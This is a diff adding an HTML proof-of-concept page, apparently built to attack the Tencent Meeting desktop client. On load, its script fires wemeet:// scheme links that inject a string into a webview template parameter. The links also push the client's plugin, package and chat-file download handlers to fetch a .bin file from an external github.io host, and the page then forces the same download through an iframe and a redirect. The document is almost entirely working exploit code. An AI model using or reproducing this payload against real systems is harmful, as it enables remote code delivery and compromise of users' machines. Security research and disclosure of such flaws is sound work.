@@ -1,0 +1,46 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P25</h1>
+<script>
+document.title='P25L-START';
+var bin='https://gitwhs.github.io/wm-poc-rce/p25.bin';
+var tb='https://gitwhs.github.io/wm-poc-rce/probe25tb.html';
+var inj='1);document.title="TPLINJ25";(';
+var official=[
+  'https://meeting.tencent.com/v2/webview/keep-app-alive',
+  'https://meeting.tencent.com/v2/webview/modal',
+  'https://meeting.tencent.com/v2/inmeeting-add-contacts'
+];
+var schemes=[];
+official.forEach(function(u){
+  schemes.push('wemeet://page/webview?url='+encodeURIComponent(u)+'&template_webview_data='+encodeURIComponent(inj));
+});
+schemes.push('wemeet://page/webview?url='+encodeURIComponent(tb));
+schemes.push('wemeet://page/premeeting/schedule_plugin_download?url='+encodeURIComponent(bin));
+schemes.push('wemeet://page/package_download?url='+encodeURIComponent(bin));
+schemes.push('wemeet://page/chat_file_download?url='+encodeURIComponent(bin));
+var i=0;
+function fire(){
+  if(i>=schemes.length){
+    document.title='P25L-DL';
+    try {
+      var a=document.createElement('iframe');
+      a.src=bin;
+      document.body.appendChild(a);
+    } catch(e){}
+    setTimeout(function(){
+      try { location.href=bin; } catch(e2){}
+      document.title='P25L-DONE';
+    }, 2500);
+    return;
+  }
+  var s=schemes[i++];
+  document.title='P25L-IFRAME-'+i;
+  var f=document.createElement('iframe');
+  f.src=s;
+  document.body.appendChild(f);
+  setTimeout(fire, 2800);
+}
+setTimeout(fire, 800);
+</script>
+</body></html>
